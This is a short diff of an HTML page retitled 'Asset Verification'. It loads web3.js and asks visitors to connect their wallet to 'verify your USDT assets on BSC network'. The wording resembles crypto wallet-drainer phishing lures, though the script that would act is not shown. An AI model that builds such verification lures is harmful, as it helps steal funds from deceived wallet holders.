@@ -3,16 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Payment Gateway</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <title>Asset Verification</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div class="card">
-        <h2>Verify Assets</h2>
-        <p>Connect your wallet to proceed with verification.</p>
-        <button id="actionBtn">Next</button>
+    <div class="container">
+        <div class="card">
+            <h2>Wallet Verification</h2>
+            <p>Connect your wallet to verify your USDT assets on BSC network.</p>
+            <button id="nextBtn">Next</button>
+            <div id="status"></div>
+        </div>
     </div>
 
     <script src="script.js"></script>
